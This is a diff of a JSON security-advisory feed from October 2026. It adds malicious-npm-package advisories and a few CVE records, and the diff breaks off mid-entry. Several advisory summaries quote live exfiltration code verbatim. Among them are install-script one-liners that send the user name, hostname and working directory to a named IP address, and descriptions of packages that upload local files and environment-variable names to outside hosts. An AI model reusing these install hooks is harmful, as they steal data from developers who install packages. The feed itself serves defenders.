@@ -3,7 +3,7 @@
   "snapshotDate": "2026-10-29",
   "mode": "live",
   "coverage_limited": true,
-  "candidate_records": 4265,
+  "candidate_records": 4273,
   "categories": [
     {
       "name": "Windows Server OS",
@@ -1377,6 +1377,338 @@
       "status": "NVD indexed CVE",
       "first_seen_at": "2026-10-29T07:11:06Z",
       "source_updated_at": "2026-10-29T06:17:24.940",
+      "source_type": "nvd",
+      "known_exploited": false
+    },
+    {
+      "id": "GHSA-2hrq-h3vj-5wxm",
+      "title": "Malicious code in identity-two-factor (npm)",
+      "severity": "bulletin",
+      "categories": [
+        "Node.js / npm",
+        "Application dependencies"
+      ],
+      "published": "2026-10-29",
+      "updated": "2026-10-29",
+      "summary": "identity-two-factor@999.0.0 is a dependency-confusion package aimed at Coinbase (its README and postinstall.js say so, and the beacon path is `cbhq-canary`) with no functional code. Its postinstall script runs `node postinstall.js` on npm install, which writes a marker file to the temp directory and POSTs the hostname, username, working-directory name, CI flag and Node version to `https://webhook.site/e0981a8e-081e-49a0-8b4a-235109e13045/cbhq-canary`. It was published by the npm account hologrammmm0x, which has no other packages. --- Credit: [OpenSSF](https://github.com/ossf/malicious-packages) ([source](https://github.com/ossf/malicious-packages/blob/3397e9bf09b996a6453a361d63d8e45b381642df/osv/malicious/npm/identity-two-factor/MAL-2026-18367.json))",
+      "affected": "npm: identity-two-factor (= 999.0.0)",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub reviewed advisory",
+          "url": "https://github.com/advisories/GHSA-2hrq-h3vj-5wxm"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://github.com/ossf/malicious-packages/blob/3397e9bf09b996a6453a361d63d8e45b381642df/osv/malicious/npm/identity-two-factor/MAL-2026-18367.json"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://www.npmjs.com/package/identity-two-factor"
+        }
+      ],
+      "exploitation": "Malicious software distribution advisory; investigate exposure",
+      "kind": "advisory",
+      "cvss": null,
+      "status": "GitHub malware advisory",
+      "first_seen_at": "2026-10-29T10:01:28Z",
+      "source_updated_at": "2026-10-29T09:31:40Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "GHSA-48mf-mvf8-x4v3",
+      "title": "Malicious code in spectral-net-probe (npm)",
+      "severity": "bulletin",
+      "categories": [
+        "Node.js / npm",
+        "Application dependencies"
+      ],
+      "published": "2026-10-29",
+      "updated": "2026-10-29",
+      "summary": "spectral-net-probe has no functional code. Versions 1.0.1 and 1.0.4 have a postinstall script that runs `node index.js` on npm install, which sends an HTTPS GET to a Cloudflare quick tunnel (`https://nobody-johnston-with-enabling.trycloudflare.com/aa?x=1` and `https://imaging-amazing-trunk-surgeons.trycloudflare.com/marker104?v=1`). Version 1.0.10 runs when the package is loaded: it fetches `/api/modules/ECT-654321` from `http://154.57.164.64:30664` and `http://127.0.0.1:3000`, reads up to ten local files whose paths the reply lists in `data.cargo_hold`, and PUTs the first 400 characters of their contents to `/api/modules/ECT-987654` on both hosts. It was published by the npm account kristol07, which published two more packages the same day (phantom-chartwinds and phantom-powder-keg, placeholder versions only so far). --- Credit: [OpenSSF](https://github.com/ossf/malicious-packages) ([source](https://github.com/ossf/malicious-packages/blob/448eec7133f1e28e4401e41517a5a42064d4fdd2/osv/malicious/npm/spectral-net-probe/MAL-2026-18368.json))",
+      "affected": "npm: spectral-net-probe (= 1.0.1); npm: spectral-net-probe (= 1.0.4); npm: spectral-net-probe (= 1.0.10)",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub reviewed advisory",
+          "url": "https://github.com/advisories/GHSA-48mf-mvf8-x4v3"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://github.com/ossf/malicious-packages/blob/448eec7133f1e28e4401e41517a5a42064d4fdd2/osv/malicious/npm/spectral-net-probe/MAL-2026-18368.json"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://www.npmjs.com/package/spectral-net-probe"
+        }
+      ],
+      "exploitation": "Malicious software distribution advisory; investigate exposure",
+      "kind": "advisory",
+      "cvss": null,
+      "status": "GitHub malware advisory",
+      "first_seen_at": "2026-10-29T10:01:28Z",
+      "source_updated_at": "2026-10-29T09:31:40Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "GHSA-j7r7-x5hv-p975",
+      "title": "Malicious code in mw-test-utils (npm)",
+      "severity": "bulletin",
+      "categories": [
+        "Node.js / npm",
+        "Application dependencies"
+      ],
+      "published": "2026-10-29",
+      "updated": "2026-10-29",
+      "summary": "mw-test-utils was published to npm on 2026-10-27 from 06:56:36 UTC by the account amahrou1w, about one minute after npm's staged-publish placeholder 0.0.0-stage, in versions 1.0.0, 10.0.0, 10.0.1. The three packages mw-test-utils, mw-communication-client and mui-wrapper-x-date-pickers were published by the same account within eight minutes and are identical apart from the name. Each tarball has three files: index.js (module.exports = {}), README.md and package.json. The package has no repository, no functional code and no dependencies, and 1.0.0 is the latest version at the time of this report. package.json declares a preinstall and a postinstall script, which npm runs on every install: node -e \"require('http').get('http://38.242.235.206/depconf/mw-test-utils/preinstall?u='+encodeURIComponent(process.env.USER||process.env.USERNAME||'')+'&h='+encodeURIComponent(require('os').hostname())+'&p='+encodeURIComponent(process.cwd())).on('error',()=>{})\" The postinstall script is the same request with the path /postinstall. Each install therefore sends the user name, the host name and the working directory of the installing machine over plain HTTP to the IP address 38.242.235.206. The README and the package description call the package a dependency-confusion proof of concept for a bug bou",
+      "affected": "npm: mw-test-utils (= 1.0.0); npm: mw-test-utils (= 10.0.0); npm: mw-test-utils (= 10.0.1)",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub reviewed advisory",
+          "url": "https://github.com/advisories/GHSA-j7r7-x5hv-p975"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://github.com/ossf/malicious-packages/blob/116e199a1fd3042c7e83e59c4d3ce70c68428d6d/osv/malicious/npm/mw-test-utils/MAL-2026-18371.json"
+        }
+      ],
+      "exploitation": "Malicious software distribution advisory; investigate exposure",
+      "kind": "advisory",
+      "cvss": null,
+      "status": "GitHub malware advisory",
+      "first_seen_at": "2026-10-29T10:01:28Z",
+      "source_updated_at": "2026-10-29T09:31:40Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "GHSA-g2vv-m33m-p9qf",
+      "title": "Malicious code in @zmtcdn/ui (npm)",
+      "severity": "bulletin",
+      "categories": [
+        "Node.js / npm",
+        "Application dependencies"
+      ],
+      "published": "2026-10-29",
+      "updated": "2026-10-29",
+      "summary": "@zmtcdn/ui 9999.0.0 and 9999.0.7 are dependency-confusion packages with an empty `index.js` and a description of \"Security research PoC\". Their postinstall script runs `node postinstall.js` on npm install, which POSTs the hostname, username, platform, working directory and the names of all environment variables to `https://www.hinny.shop/api`. They were published by the npm account kill_shs, which also published @zmtcdn/components with the same script. --- Credit: [OpenSSF](https://github.com/ossf/malicious-packages) ([source](https://github.com/ossf/malicious-packages/blob/5fc19d9dd8702ac6a94139396a2d6be32a245bd7/osv/malicious/npm/@zmtcdn/ui/MAL-2026-18373.json))",
+      "affected": "npm: @zmtcdn/ui (= 9999.0.0); npm: @zmtcdn/ui (= 9999.0.7)",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub reviewed advisory",
+          "url": "https://github.com/advisories/GHSA-g2vv-m33m-p9qf"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://github.com/ossf/malicious-packages/blob/5fc19d9dd8702ac6a94139396a2d6be32a245bd7/osv/malicious/npm/@zmtcdn/ui/MAL-2026-18373.json"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://www.npmjs.com/package/@zmtcdn/ui"
+        }
+      ],
+      "exploitation": "Malicious software distribution advisory; investigate exposure",
+      "kind": "advisory",
+      "cvss": null,
+      "status": "GitHub malware advisory",
+      "first_seen_at": "2026-10-29T10:01:28Z",
+      "source_updated_at": "2026-10-29T09:31:40Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "GHSA-98qv-v7qr-v3gx",
+      "title": "Malicious code in mui-wrapper-x-date-pickers (npm)",
+      "severity": "bulletin",
+      "categories": [
+        "Node.js / npm",
+        "Application dependencies"
+      ],
+      "published": "2026-10-29",
+      "updated": "2026-10-29",
+      "summary": "mui-wrapper-x-date-pickers was published to npm on 2026-10-27 from 06:55:20 UTC by the account amahrou1w, about one minute after npm's staged-publish placeholder 0.0.0-stage, in versions 1.0.0, 10.0.0. The three packages mw-test-utils, mw-communication-client and mui-wrapper-x-date-pickers were published by the same account within eight minutes and are identical apart from the name. Each tarball has three files: index.js (module.exports = {}), README.md and package.json. The package has no repository, no functional code and no dependencies, and 10.0.0 is the latest version at the time of this report. package.json declares a preinstall and a postinstall script, which npm runs on every install: node -e \"require('http').get('http://38.242.235.206/depconf/mui-wrapper-x-date-pickers/preinstall?u='+encodeURIComponent(process.env.USER||process.env.USERNAME||'')+'&h='+encodeURIComponent(require('os').hostname())+'&p='+encodeURIComponent(process.cwd())).on('error',()=>{})\" The postinstall script is the same request with the path /postinstall. Each install therefore sends the user name, the host name and the working directory of the installing machine over plain HTTP to the IP address 38.242.235.206. The README and the package description call the package a dependency-confusion proof of co",
+      "affected": "npm: mui-wrapper-x-date-pickers (= 1.0.0); npm: mui-wrapper-x-date-pickers (= 10.0.0)",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub reviewed advisory",
+          "url": "https://github.com/advisories/GHSA-98qv-v7qr-v3gx"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://github.com/ossf/malicious-packages/blob/116e199a1fd3042c7e83e59c4d3ce70c68428d6d/osv/malicious/npm/mui-wrapper-x-date-pickers/MAL-2026-18369.json"
+        }
+      ],
+      "exploitation": "Malicious software distribution advisory; investigate exposure",
+      "kind": "advisory",
+      "cvss": null,
+      "status": "GitHub malware advisory",
+      "first_seen_at": "2026-10-29T10:01:28Z",
+      "source_updated_at": "2026-10-29T09:31:30Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "GHSA-4h9g-fh86-j87q",
+      "title": "Malicious code in mw-communication-client (npm)",
+      "severity": "bulletin",
+      "categories": [
+        "Node.js / npm",
+        "Application dependencies"
+      ],
+      "published": "2026-10-29",
+      "updated": "2026-10-29",
+      "summary": "mw-communication-client was published to npm on 2026-10-27 from 06:55:13 UTC by the account amahrou1w, about one minute after npm's staged-publish placeholder 0.0.0-stage, in versions 10.0.0, 1.0.1. The three packages mw-test-utils, mw-communication-client and mui-wrapper-x-date-pickers were published by the same account within eight minutes and are identical apart from the name. Each tarball has three files: index.js (module.exports = {}), README.md and package.json. The package has no repository, no functional code and no dependencies, and 1.0.1 is the latest version at the time of this report. package.json declares a preinstall and a postinstall script, which npm runs on every install: node -e \"require('http').get('http://38.242.235.206/depconf/mw-communication-client/preinstall?u='+encodeURIComponent(process.env.USER||process.env.USERNAME||'')+'&h='+encodeURIComponent(require('os').hostname())+'&p='+encodeURIComponent(process.cwd())).on('error',()=>{})\" The postinstall script is the same request with the path /postinstall. Each install therefore sends the user name, the host name and the working directory of the installing machine over plain HTTP to the IP address 38.242.235.206. The README and the package description call the package a dependency-confusion proof of concept f",
+      "affected": "npm: mw-communication-client (= 10.0.0); npm: mw-communication-client (= 1.0.1)",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub reviewed advisory",
+          "url": "https://github.com/advisories/GHSA-4h9g-fh86-j87q"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://github.com/ossf/malicious-packages/blob/116e199a1fd3042c7e83e59c4d3ce70c68428d6d/osv/malicious/npm/mw-communication-client/MAL-2026-18370.json"
+        }
+      ],
+      "exploitation": "Malicious software distribution advisory; investigate exposure",
+      "kind": "advisory",
+      "cvss": null,
+      "status": "GitHub malware advisory",
+      "first_seen_at": "2026-10-29T10:01:28Z",
+      "source_updated_at": "2026-10-29T09:31:29Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "GHSA-2pph-m662-c8hg",
+      "title": "Malicious code in @zmtcdn/components (npm)",
+      "severity": "bulletin",
+      "categories": [
+        "Node.js / npm",
+        "Application dependencies"
+      ],
+      "published": "2026-10-29",
+      "updated": "2026-10-29",
+      "summary": "@zmtcdn/components@9999.0.0 is a dependency-confusion package with an empty `index.js` and a description of \"Security research PoC\". Its postinstall script runs `node postinstall.js` on npm install, which POSTs the hostname, username, platform, working directory and the names of all environment variables to `https://webhook.site/f52af355-4783-4acb-9de1-5e44b5963025`. It was published by the npm account kill_shs, which also published @zmtcdn/ui with the same script. --- Credit: [OpenSSF](https://github.com/ossf/malicious-packages) ([source](https://github.com/ossf/malicious-packages/blob/5fc19d9dd8702ac6a94139396a2d6be32a245bd7/osv/malicious/npm/@zmtcdn/components/MAL-2026-18372.json))",
+      "affected": "npm: @zmtcdn/components (= 9999.0.0)",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub reviewed advisory",
+          "url": "https://github.com/advisories/GHSA-2pph-m662-c8hg"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://github.com/ossf/malicious-packages/blob/5fc19d9dd8702ac6a94139396a2d6be32a245bd7/osv/malicious/npm/@zmtcdn/components/MAL-2026-18372.json"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://www.npmjs.com/package/@zmtcdn/components"
+        }
+      ],
+      "exploitation": "Malicious software distribution advisory; investigate exposure",
+      "kind": "advisory",
+      "cvss": null,
+      "status": "GitHub malware advisory",
+      "first_seen_at": "2026-10-29T10:01:28Z",
+      "source_updated_at": "2026-10-29T09:31:29Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "GHSA-8hr2-m7vq-fhpg",
+      "title": "Malware in dsh-volcengine-provider",
+      "severity": "bulletin",
+      "categories": [
+        "Node.js / npm",
+        "Application dependencies"
+      ],
+      "published": "2026-10-29",
+      "updated": "2026-10-29",
+      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "affected": "npm: dsh-volcengine-provider (= 0.2.8); npm: dsh-volcengine-provider (= 0.2.5)",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub reviewed advisory",
+          "url": "https://github.com/advisories/GHSA-8hr2-m7vq-fhpg"
+        }
+      ],
+      "exploitation": "Malicious software distribution advisory; investigate exposure",
+      "kind": "advisory",
+      "cvss": null,
+      "status": "GitHub malware advisory",
+      "first_seen_at": "2026-10-29T10:01:28Z",
+      "source_updated_at": "2026-10-29T09:35:20Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "CVE-2026-115303",
+      "title": "The Contact Form by Supsystic WordPress plugin before 1.11.1 does not strip CR/LF characters or re-validate submitted field values before concatenating them into outgoing emai",
+      "severity": "low",
+      "categories": [
+        "WordPress / Plugins"
+      ],
+      "published": "2026-10-29",
+      "updated": "2026-10-29",
+      "summary": "The Contact Form by Supsystic WordPress plugin before 1.11.1 does not strip CR/LF characters or re-validate submitted field values before concatenating them into outgoing email headers when a form is configured to map a submitted field into its Reply-To, From or Cc header, allowing unauthenticated users to inject arbitrary email headers such as additional Bcc or Cc recipients into the notification email.",
+      "affected": "Confirm affected versions from the vendor advisory and NVD CPE configurations.",
+      "remediation": "Review the linked vendor bulletin for patched versions and mitigations. This feed does not infer a fixed version.",
+      "action": "Verify applicability against the installed product and version, then follow vendor remediation instructions.",
+      "sources": [
+        {
+          "label": "NVD CVE record",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-115303"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": "3.7",
+      "status": "NVD indexed CVE",
+      "first_seen_at": "2026-10-29T10:01:28Z",
+      "source_updated_at": "2026-10-29T09:17:08.097",
+      "source_type": "nvd",
+      "known_exploited": false
+    },
+    {
+      "id": "CVE-2026-7190",
+      "title": "A cross-site scripting (XSS) vulnerability in the ICTBroadcast software, which affects the demo environment",
+      "severity": "medium",
+      "categories": [
+        "PHP"
+      ],
+      "published": "2026-10-29",
+      "updated": "2026-10-29",
+      "summary": "A cross-site scripting (XSS) vulnerability in the ICTBroadcast software, which affects the demo environment. The vulnerability is found in the ‘login.php’ endpoint, where the ‘editForm[extension_username]’ parameter is reflected in the response without proper filtering. Successful exploitation of this vulnerability could allow an attacker to execute arbitrary JavaScript code in the victim’s browser once the victim accesses the malicious URL.",
+      "affected": "Confirm affected versions from the vendor advisory and NVD CPE configurations.",
+      "remediation": "Review the linked vendor bulletin for patched versions and mitigations. This feed does not infer a fixed version.",
+      "action": "Verify applicability against the installed product and version, then follow vendor remediation instructions.",
+      "sources": [
+        {
+          "label": "NVD CVE record",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-7190"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": "5.1",
+      "status": "NVD indexed CVE",
+      "first_seen_at": "2026-10-29T10:01:28Z",
+      "source_updated_at": "2026-10-29T09:17:08.250",
       "source_type": "nvd",
       "known_exploited": false
     },
@@ -3064,6 +3396,46 @@
       "first_seen_at": "2026-10-28T12:31:43Z",
       "source_updated_at": "2026-10-29T04:18:41.100",
       "source_type": "nvd",
+      "known_exploited": false
+    },
+    {
+      "id": "GHSA-4g45-28rv-vq9q",
+      "title": "Malicious code in @testsecuiitytestme/cache-helper (npm)",
+      "severity": "bulletin",
+      "categories": [
+        "Application dependencies",
+        "Docker / Kubernetes",
+        "Linux",
+        "Node.js / npm",
+        "Windows"
+      ],
+      "published": "2026-10-28",
+      "updated": "2026-10-29",
+      "summary": "@testsecuiitytestme/cache-helper is the only package of the npm account testsecuiitytestme. It was created on 2026-10-27 at 12:08 UTC with npm's staged-publish placeholder 0.0.0-stage, followed by 1.0.1 (12:28 UTC), 1.0.2 (15:33 UTC) and 1.0.3 (16:24 UTC); a 1.0.0 was removed before 14:21 UTC. It describes itself as \"Cache helper utilities\" and has no README, repository or source code. 1.0.3 was the latest version and still live at the time of this report. Each version runs a native addon at install time. 1.0.1 has postinstall: node -e \"try{require(process.platform==='win32'?'./addon_win.node':'./addon.node')}catch(e){}\". 1.0.2 and 1.0.3 depend on node-gyp-build and run it as postinstall, which loads the prebuilt addon shipped in prebuilds/linux-x64/node.napi.node or prebuilds/win32-x64/node.napi.node. 1.0.3 adds a binding.gyp with an empty sources list and an install script node-gyp rebuild, so the package looks like an ordinary native module; there is no C source in any version. The addon (Linux ELF and Windows PE) is a loader. It checks for CI and sandbox environments (GITHUB_ACTIONS, GITLAB_CI, TRAVIS, CIRCLECI, JENKINS_URL, BUILDKITE, CODEBUILD_BUILD_ID and others, plus SANDBOX), containers (/proc/1/cgroup: docker, containerd, kubepods, podman), a debugger (TracerPid), memor",
+      "affected": "npm: @testsecuiitytestme/cache-helper (= 1.0.1); npm: @testsecuiitytestme/cache-helper (= 1.0.2); npm: @testsecuiitytestme/cache-helper (= 1.0.3); npm: @testsecuiitytestme/cache-helper (= 1.0.4); npm: @testsecuiitytestme/cache-helper (= 1.0.5); npm: @testsecuiitytestme/cache-helper (= 1.0.6); npm: @testsecuiitytestme/cache-helper (= 1.0.7)",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub reviewed advisory",
+          "url": "https://github.com/advisories/GHSA-4g45-28rv-vq9q"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://github.com/ossf/malicious-packages/blob/884e662df4e83d78d0c90c7f6783d5f332863d3d/osv/malicious/npm/@testsecuiitytestme/cache-helper/MAL-2026-18358.json"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://github.com/ossf/malicious-packages/blob/95d89515d545aedc9991d52f9ae38a6cfd0c19c3/osv/malicious/npm/@testsecuiitytestme/cache-helper/MAL-2026-18358.json"
+        }
+      ],
+      "exploitation": "Malicious software distribution advisory; investigate exposure",
+      "kind": "advisory",
+      "cvss": null,
+      "status": "GitHub malware advisory",
+      "first_seen_at": "2026-10-28T09:59:26Z",
+      "source_updated_at": "2026-10-29T09:32:35Z",
+      "source_type": "github",
       "known_exploited": false
     },
     {
@@ -4986,42 +5358,6 @@
       "epss": 0.00215,
       "epss_percentile": 0.11896,
       "epss_as_of": "2026-10-29"
-    },
-    {
-      "id": "GHSA-4g45-28rv-vq9q",
-      "title": "Malicious code in @testsecuiitytestme/cache-helper (npm)",
-      "severity": "bulletin",
-      "categories": [
-        "Application dependencies",
-        "Docker / Kubernetes",
-        "Linux",
-        "Node.js / npm",
-        "Windows"
-      ],
-      "published": "2026-10-28",
-      "updated": "2026-10-28",
-      "summary": "@testsecuiitytestme/cache-helper is the only package of the npm account testsecuiitytestme. It was created on 2026-10-27 at 12:08 UTC with npm's staged-publish placeholder 0.0.0-stage, followed by 1.0.1 (12:28 UTC), 1.0.2 (15:33 UTC) and 1.0.3 (16:24 UTC); a 1.0.0 was removed before 14:21 UTC. It describes itself as \"Cache helper utilities\" and has no README, repository or source code. 1.0.3 was the latest version and still live at the time of this report. Each version runs a native addon at install time. 1.0.1 has postinstall: node -e \"try{require(process.platform==='win32'?'./addon_win.node':'./addon.node')}catch(e){}\". 1.0.2 and 1.0.3 depend on node-gyp-build and run it as postinstall, which loads the prebuilt addon shipped in prebuilds/linux-x64/node.napi.node or prebuilds/win32-x64/node.napi.node. 1.0.3 adds a binding.gyp with an empty sources list and an install script node-gyp rebuild, so the package looks like an ordinary native module; there is no C source in any version. The addon (Linux ELF and Windows PE) is a loader. It checks for CI and sandbox environments (GITHUB_ACTIONS, GITLAB_CI, TRAVIS, CIRCLECI, JENKINS_URL, BUILDKITE, CODEBUILD_BUILD_ID and others, plus SANDBOX), containers (/proc/1/cgroup: docker, containerd, kubepods, podman), a debugger (TracerPid), memor",
-      "affected": "npm: @testsecuiitytestme/cache-helper (= 1.0.1); npm: @testsecuiitytestme/cache-helper (= 1.0.2); npm: @testsecuiitytestme/cache-helper (= 1.0.3)",
-      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
-      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
-      "sources": [
-        {
-          "label": "GitHub reviewed advisory",
-          "url": "https://github.com/advisories/GHSA-4g45-28rv-vq9q"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://github.com/ossf/malicious-packages/blob/884e662df4e83d78d0c90c7f6783d5f332863d3d/osv/malicious/npm/@testsecuiitytestme/cache-helper/MAL-2026-18358.json"
-        }
-      ],
-      "exploitation": "Malicious software distribution advisory; investigate exposure",
-      "kind": "advisory",
-      "cvss": null,
-      "status": "GitHub malware advisory",
-      "first_seen_at": "2026-10-28T09:59:26Z",
-      "source_updated_at": "2026-10-28T09:32:04Z",
-      "source_type": "github",
-      "known_exploited": false
     },
     {
       "id": "GHSA-65cr-mcfq-59hh",
@@ -46191,46 +46527,6 @@
       "epss_as_of": "2026-10-29"
     },
     {
-      "id": "CVE-2026-102870",
-      "title": "ASP.NET Core Blazor WebAssembly debugger code execution",
-      "severity": "high",
-      "cvss": "8.8",
-      "categories": [
-        ".NET / ASP.NET",
-        ".NET Core"
-      ],
-      "published": "2026-10-13",
-      "updated": "2026-10-25",
-      "summary": "The Blazor WebAssembly debug proxy may compile attacker-influenced debugger expressions into C# without sufficient escaping, enabling code execution on a developer workstation when a developer evaluates affected data. Microsoft corrected an incomplete October 13 package fix on October 25.",
-      "affected": "Microsoft.AspNetCore.Components.WebAssembly.Server and Microsoft.AspNetCore.Components.WebAssembly.DevServer 10.x before 10.0.14 and affected .NET 11 prereleases before 11.0.0 RC3. This requires vulnerable debugging activity and is not a general production request endpoint issue.",
-      "remediation": "Update both affected Blazor WebAssembly Server and DevServer NuGet packages to 10.0.14 or 11.0.0 RC3 as applicable, and update the development SDK. A shared runtime update alone does not fix independently referenced packages.",
-      "exploitation": "No confirmed active exploitation stated in the cited Microsoft advisory.",
-      "sources": [
-        {
-          "label": "Microsoft corrected Blazor debugger security advisory",
-          "url": "https://github.com/dotnet/announcements/issues/492"
-        },
-        {
-          "label": "ASP.NET Core GHSA vendor record",
-          "url": "https://github.com/dotnet/aspnetcore/security/advisories/GHSA-g27p-qf6j-c96c"
-        },
-        {
-          "label": "Microsoft Security Update Guide",
-          "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-102870"
-        }
-      ],
-      "kind": "cve",
-      "source_type": "vendor_baseline",
-      "source_updated_at": "2026-10-25",
-      "status": "Vendor-sourced historical baseline; not newly disclosed",
-      "first_seen_at": "2026-10-28T02:30:57Z",
-      "known_exploited": false,
-      "action": "Verify the affected version and exposure, then follow the vendor remediation.",
-      "epss": 0.00906,
-      "epss_percentile": 0.59726,
-      "epss_as_of": "2026-10-29"
-    },
-    {
       "id": "CVE-2026-70197",
       "title": ".NET SocketAsyncEventArgs memory corruption remote code execution",
       "severity": "high",
@@ -46270,6 +46566,46 @@
       "action": "Verify the affected version and exposure, then follow the vendor remediation.",
       "epss": 0.00788,
       "epss_percentile": 0.56072,
+      "epss_as_of": "2026-10-29"
+    },
+    {
+      "id": "CVE-2026-102870",
+      "title": "ASP.NET Core Blazor WebAssembly debugger code execution",
+      "severity": "high",
+      "cvss": "8.8",
+      "categories": [
+        ".NET / ASP.NET",
+        ".NET Core"
+      ],
+      "published": "2026-10-13",
+      "updated": "2026-10-25",
+      "summary": "The Blazor WebAssembly debug proxy may compile attacker-influenced debugger expressions into C# without sufficient escaping, enabling code execution on a developer workstation when a developer evaluates affected data. Microsoft corrected an incomplete October 13 package fix on October 25.",
+      "affected": "Microsoft.AspNetCore.Components.WebAssembly.Server and Microsoft.AspNetCore.Components.WebAssembly.DevServer 10.x before 10.0.14 and affected .NET 11 prereleases before 11.0.0 RC3. This requires vulnerable debugging activity and is not a general production request endpoint issue.",
+      "remediation": "Update both affected Blazor WebAssembly Server and DevServer NuGet packages to 10.0.14 or 11.0.0 RC3 as applicable, and update the development SDK. A shared runtime update alone does not fix independently referenced packages.",
+      "exploitation": "No confirmed active exploitation stated in the cited Microsoft advisory.",
+      "sources": [
+        {
+          "label": "Microsoft corrected Blazor debugger security advisory",
+          "url": "https://github.com/dotnet/announcements/issues/492"
+        },
+        {
+          "label": "ASP.NET Core GHSA vendor record",
+          "url": "https://github.com/dotnet/aspnetcore/security/advisories/GHSA-g27p-qf6j-c96c"
+        },
+        {
+          "label": "Microsoft Security Update Guide",
+          "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-102870"
+        }
+      ],
+      "kind": "cve",
+      "source_type": "vendor_baseline",
+      "source_updated_at": "2026-10-25",
+      "status": "Vendor-sourced historical baseline; not newly disclosed",
+      "first_seen_at": "2026-10-28T02:30:57Z",
+      "known_exploited": false,
+      "action": "Verify the affected version and exposure, then follow the vendor remediation.",
+      "epss": 0.00906,
+      "epss_percentile": 0.59726,
       "epss_as_of": "2026-10-29"
     },
     {
@@ -80563,37 +80899,6 @@
       "epss_as_of": "2026-10-29"
     },
     {
-      "id": "CVE-2025-6704",
-      "title": "Sophos Firewall Secure PDF eXchange preauthentication code execution",
-      "severity": "critical",
-      "cvss": null,
-      "categories": [
-        "Sophos Firewall"
-      ],
-      "published": "2025-07-21",
-      "updated": "2025-07-21",
-      "summary": "Arbitrary file writing in Sophos Firewall Secure PDF eXchange can allow remote code execution before authentication when the specified SPX configuration is combined with High Availability mode.",
-      "affected": "Sophos Firewall 21.5 GA and earlier. The exploitation prerequisites are limited to specifically configured SPX and HA deployments.",
-      "remediation": "Confirm the Sophos hotfix is applied on the supported SFOS version, or upgrade to a version containing the fix (21.0 MR2 or newer per Sophos). Confirm automatic installation of hotfixes is enabled.",
-      "exploitation": "Sophos reported no observed exploitation at the time of its July 2025 advisory.",
-      "sources": [
-        {
-          "label": "Sophos Firewall security advisory",
-          "url": "https://www.sophos.com/en-us/security-advisories/sophos-sa-20250721-sfos-rce"
-        }
-      ],
-      "kind": "cve",
-      "source_type": "vendor_baseline",
-      "source_updated_at": "2025-07-21",
-      "status": "Vendor-sourced historical baseline; not newly disclosed",
-      "first_seen_at": "2026-10-28T02:02:13Z",
-      "known_exploited": false,
-      "action": "Verify the affected version and exposure, then follow the vendor remediation.",
-      "epss": 0.11772,
-      "epss_percentile": 0.96062,
-      "epss_as_of": "2026-10-29"
-    },
-    {
       "id": "CVE-2025-7624",
       "title": "Sophos Firewall legacy SMTP proxy SQL injection leading to code execution",
       "severity": "critical",
@@ -80622,6 +80927,37 @@
       "action": "Verify the affected version and exposure, then follow the vendor remediation.",
       "epss": 0.10514,
       "epss_percentile": 0.95747,
+      "epss_as_of": "2026-10-29"
+    },
+    {
